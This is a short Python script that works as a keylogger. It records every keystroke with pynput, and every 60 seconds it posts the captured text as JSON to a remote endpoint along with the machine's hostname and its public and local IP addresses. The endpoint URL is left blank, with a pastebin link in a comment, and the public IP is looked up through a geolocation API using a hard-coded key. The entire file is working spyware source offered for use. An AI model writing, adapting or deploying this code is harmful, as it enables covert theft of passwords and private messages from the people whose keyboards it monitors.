#lol sorry
from pynput.keyboard import Listener # pip install requests
from threading import Timer
import requests # pip install requests
import socket

msg = ""
wait_between_send = 60 # in seconds

def on_press(key):
    global msg
    if len(str(key)) == 3:
        key = str(key)[1:-1]
        msg += str(key)
    elif str(key) == "Key.space":
        msg += " "
    elif str(key) == "Key.enter":
        msg += "\n"
    elif str(key) == "Key.backspace":
        if len(msg.replace("↞", "")) > 0:
            msg = msg[:-1]
        else:
            msg += "↞"

def send():
    global msg
    if len(msg) > 0:
        headers = {"content-type": "application/json"}
        ip = requests.get("https://api.ipgeolocation.io/getip?apiKey=ecf13c4bb0814054b3e27bd99fd9a720", headers=headers).json()["ip"]
        json = {"content": f"```\nDevice Name: {socket.gethostname()}\nPublic Ip: {ip}\nLocal Ip: {socket.gethostbyname(socket.gethostname())}\n\n{msg}\n```"}
        r = requests.post("", headers=headers, json=json) # https://pastebin.com/EZbiTNEs
        msg = ""
    Timer(wait_between_send, send).start()

listener = Listener(on_press=on_press)
listener.start()

Timer(wait_between_send, send).start()
